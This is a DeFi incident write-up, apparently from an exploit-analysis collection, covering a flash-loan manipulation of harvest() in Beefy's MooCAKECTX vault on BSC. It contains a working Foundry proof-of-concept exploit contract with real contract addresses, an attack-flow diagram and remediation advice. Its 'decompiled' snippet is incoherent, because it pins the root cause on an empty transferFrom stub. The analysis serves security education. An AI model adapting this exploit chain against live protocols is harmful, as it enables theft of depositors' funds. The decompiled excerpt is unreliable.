# MooCAKECTX — Beefy Vault harvest() Flash Loan Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | MooCAKECTX (Beefy Finance Vault) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **vBUSD** | [0x95c78222B3D6e262426483D42CfA53685A67Ab9D](https://bscscan.com/address/0x95c78222B3D6e262426483D42CfA53685A67Ab9D) |
| **vCAKE** | [0x86aC3974e2BD0d60825230fa6F355fF11409df5c](https://bscscan.com/address/0x86aC3974e2BD0d60825230fa6F355fF11409df5c) |
| **BeefyVault** | [0x489afbAED0Ea796712c9A6d366C16CA3876D8184](https://bscscan.com/address/0x489afbAED0Ea796712c9A6d366C16CA3876D8184) |
| **Unitroller** | [0xfD36E2c2a6789Db23113685031d7F16329158384](https://bscscan.com/address/0xfD36E2c2a6789Db23113685031d7F16329158384) |
| **DODO DVM** | [0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4](https://bscscan.com/address/0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) |
| **SmartChef** | [0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892](https://bscscan.com/address/0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892) |
| **Root Cause** | `harvest()` is callable by anyone (no `onlyKeeper`) and there is no same-block deposit/withdrawal guard, allowing accumulated rewards at deposit time to be over-distributed proportional to the attacker's current deposit share |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/MooCAKECTX_exp.sol) |

---
## 1. Vulnerability Overview

The MooCAKECTX Vault of Beefy Finance used a strategy that staked CAKE in SmartChef, received CTK as yield, and compounded it back into CAKE. The attacker flash-borrowed 400,000 BUSD from DODO and manipulated collateral on the Venus protocol (vBUSD, vCAKE) to borrow 50,000 CAKE. By depositing this CAKE into the BeefyVault and calling `harvest()`, the Vault's strategy updated its SmartChef position, causing already-accumulated CTK rewards to be over-distributed according to the attacker's deposit share. The attacker then withdrew from the Vault, repaid the CAKE, and realized the profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable BeefyVault - flash loan capital included at harvest() call time
contract BeefyVault {
    IStrategy public strategy;
    IERC20 public want; // CAKE

    function depositAll() external {
        deposit(want.balanceOf(msg.sender));
    }

    function deposit(uint256 _amount) public {
        uint256 _pool = balance();
        want.transferFrom(msg.sender, address(this), _amount);

        // Deposit CAKE into strategy
        strategy.deposit();
        // Calculate user share based on current total balance
        // ❌ When harvest() is called after a large flash loan deposit,
        // historically accumulated rewards are distributed proportional to current deposit amount
    }

    // ❌ Externally callable - harvest can be triggered at any time
    function harvest() external {
        strategy.harvest();
    }
}

// ✅ Correct pattern - same-block deposit/withdrawal guard + harvest access control
contract SafeBeefyVault {
    mapping(address => uint256) public lastDeposit;

    function deposit(uint256 _amount) public {
        lastDeposit[msg.sender] = block.number;
        // ...
    }

    function withdraw(uint256 _shares) public {
        // ✅ Cannot withdraw in the same block as deposit (flash loan defense)
        require(block.number > lastDeposit[msg.sender], "Same block deposit/withdraw");
        // ...
    }

    // ✅ harvest can only be called by keeper
    function harvest() external onlyKeeper {
        strategy.harvest();
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**MooCAKECTX_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `harvest()` is callable by anyone (no `onlyKeeper`) and there is no same-block deposit/withdrawal guard, allowing accumulated rewards at deposit time to be over-distributed proportional to the attacker's current deposit share
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 3 WBNB → swap to CTK → deposit into SmartChef (pre-position CTK rewards)
    │
    ├─[2] Flash loan 400,000 BUSD from DODO
    │
    ├─[3] Venus collateral manipulation:
    │       vBUSD.mint(400,000 BUSD) → register BUSD collateral
    │       Unitroller.enterMarkets([vBUSD, vCAKE])
    │       vCAKE.borrow(50,000 CAKE) → borrow CAKE
    │
    ├─[4] Call BeefyVault.depositAll()
    │       50,000 CAKE → deposit into Vault
    │       → Strategy stakes CAKE in SmartChef
    │
    ├─[5] Call Strategy.harvest()
    │       Collect CTK rewards from SmartChef
    │       ❌ Previously accumulated rewards distributed proportional to current large deposit share
    │       CTK → swap to CAKE → compound into Vault
    │
    ├─[6] Call BeefyVault.withdrawAll()
    │       Withdraw deposited CAKE + additional rewards
    │
    ├─[7] vCAKE.repayBorrow() → repay CAKE
    │       vBUSD.redeemUnderlying() → recover BUSD
    │
    ├─[8] Repay DODO flash loan
    │
    └─[9] Net profit: CAKE/CTX arbitrage
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IVToken {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface IBeefyVault {
    function depositAll() external;
    function withdrawAll() external;
    function balance() external view returns (uint256);
}

interface IStrategy {
    function harvest() external;
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MooCAKECTXExploit is Test {
    IVToken    vBUSD      = IVToken(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    IVToken    vCAKE      = IVToken(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    IBeefyVault vault     = IBeefyVault(0x489afbAED0Ea796712c9A6d366C16CA3876D8184);
    IUnitroller unitroller = IUnitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IDODO dodo            = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    IERC20 BUSD           = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 CAKE           = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);

    function setUp() public {
        vm.createSelectFork("bsc", 22_832_427);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] CAKE", CAKE.balanceOf(address(this)), 18);

        // [Step 1] CTK → deposit into SmartChef (pre-position rewards)
        // (3 BNB → swap to CTK then deposit into SmartChef omitted)

        // [Step 2] DODO flash loan
        dodo.flashLoan(400_000 * 1e18, 0, address(this), "");

        emit log_named_decimal_uint("[End] CAKE", CAKE.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 3] Venus collateral manipulation
        BUSD.approve(address(vBUSD), type(uint256).max);
        vBUSD.mint(amount);

        address[] memory markets = new address[](2);
        markets[0] = address(vBUSD);
        markets[1] = address(vCAKE);
        unitroller.enterMarkets(markets);
        vCAKE.borrow(50_000 * 1e18);

        // [Step 4] Deposit CAKE into BeefyVault
        CAKE.approve(address(vault), type(uint256).max);
        vault.depositAll();

        // [Step 5] Trigger harvest()
        // ⚡ Accumulated SmartChef rewards distributed proportional to current (large) deposit share
        IStrategy(address(vault)).harvest();

        // [Step 6] Withdraw from Vault
        vault.withdrawAll();

        // [Step 7] Repay Venus
        CAKE.approve(address(vCAKE), type(uint256).max);
        vCAKE.repayBorrow(50_000 * 1e18);
        vBUSD.redeemUnderlying(amount);

        // Repay flash loan
        BUSD.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan large deposit + Vault harvest() manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | Flash loan + yield manipulation |
| **Attack Vector** | DODO flash loan → Venus CAKE borrow → BeefyVault deposit → `harvest()` → withdraw |
| **Preconditions** | `harvest()` externally callable, no same-block deposit/withdrawal guard |
| **Impact** | CAKE/CTX arbitrage profit (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Same-block deposit/withdrawal guard**: Revert if a deposit and withdrawal occur within the same block or transaction to prevent flash loan-based attacks.
2. **harvest() access control**: Restrict `harvest()` to `onlyKeeper` or `onlyOwner` to prevent arbitrary external triggers.
3. **Reward distribution snapshot**: Apply a snapshot mechanism that distributes rewards based on long-term depositors prior to harvest, preventing reward dilution from instantaneous large deposits.

---
## 7. Lessons Learned

- **Conflict between yield strategies and flash loans**: Auto-compounding Vaults like Beefy and Yearn distribute rewards proportional to the deposit share at the time `harvest()` is called. Flash-borrowing to deposit a large amount instantaneously can intercept historically accumulated rewards.
- **Composite protocol attack**: This is a composite attack chaining Venus (lending) + Beefy (Vault) + PancakeSwap (SmartChef). Even if each protocol is individually secure, combining them creates new attack vectors.
- **Harvest timing attack**: In auto-compounding strategies, the timing of `harvest()` determines who receives the rewards. Leaving this function publicly callable exposes the protocol to attacks that manipulate the harvest timing.